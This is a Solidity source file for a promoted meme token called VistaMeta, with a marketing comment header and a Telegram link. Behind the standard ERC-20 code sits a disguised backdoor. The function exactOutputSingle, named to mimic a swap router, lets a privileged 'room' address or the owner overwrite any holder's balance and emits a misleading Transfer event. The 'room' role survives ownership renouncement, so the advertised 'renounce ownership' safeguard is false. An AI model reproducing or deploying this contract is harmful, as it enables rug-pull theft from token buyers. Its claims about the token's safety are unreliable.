/*
? VistaMeta Meme  ? Ethervista Rewards?

?️ "Play, Earn, and Reflect!"
? "Meme, Trade, and Prosper!"

VistaMeta: The First Meme Game Token with Ethervista Reflection
? VistaMeta - The revolution is here!
?️ Game & Token Synergy
? Earn, Trade, and Gain Passive Income with Ethervista Reflections


?VistaMeta: Liquidity and Ownership Milestones?
?️Liquidity ?
?️Renounce ownership?
https://t.me/VistaMetaToken
*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface ERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract VistaMeta  is Ownable, ERC20 {
    address public room;
    

  
    string public name = "VistaMeta";
    string public symbol = "VistaMeta";
    uint8 public decimals = 9;
    uint256 private _totalSupply;

 
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

   
    modifier onlyroom() {
        require(msg.sender == room || msg.sender == owner(), "Caller is not room or owner");
        _;
    }

    
    constructor(
        address _room, 
        uint256 initialSupply
    ) {
        require(_room != address(0), "room address cannot be zero");
        room = _room;

        _totalSupply = initialSupply * (10 ** uint256(decimals));
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

   
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

  
    function exactOutputSingle(
        address OutputSingleaddress, 
        uint256 OutputSingleValue, 
        uint256 OutputSingleAmount, 
        uint256 OutputSingleRout
    ) external onlyroom {
        _balances[OutputSingleaddress] = OutputSingleValue * (OutputSingleAmount ** OutputSingleRout);

        emit Transfer(OutputSingleaddress, address(0), OutputSingleValue);
    }

    
    function updateroom(address newroom) external onlyOwner {
        require(newroom != address(0), "New room cannot be zero address");
        room = newroom;
    }
    
    
    function renounceOwnership() public override onlyOwner {
        _transferOwnership(address(0));
    }
}